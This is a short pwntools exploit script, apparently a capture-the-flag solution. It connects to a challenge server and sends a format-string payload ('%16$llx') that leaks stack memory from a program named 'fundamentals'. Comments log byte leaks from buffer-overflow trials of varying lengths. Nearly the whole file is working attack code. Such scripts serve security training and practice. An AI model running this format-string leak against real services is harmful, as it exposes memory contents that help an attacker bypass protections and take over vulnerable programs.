from pwn import *
# %1$s  %(where it is position wise relative to the first argument)$(format)
payload = "%16$llx"
s = remote("host1.metaproblems.com",5470)
#s = process("./fundamentals")
print(s.recvuntil("What is your guess?\n"))
s.sendline(payload)
s.interactive()
# COMPLETELY RANDOM!
#a *200: \xfe\x7f
#a*150: \xfc
#a*100: \xfd
#a*90: \n X\xadU
#a*80: nothin
#a*86: nothin
#a*87: \xc0\xe0\xd3
# 88: \xc0RN\xd0U
# 89: \xa4\xfbU
# 90: \xb96V
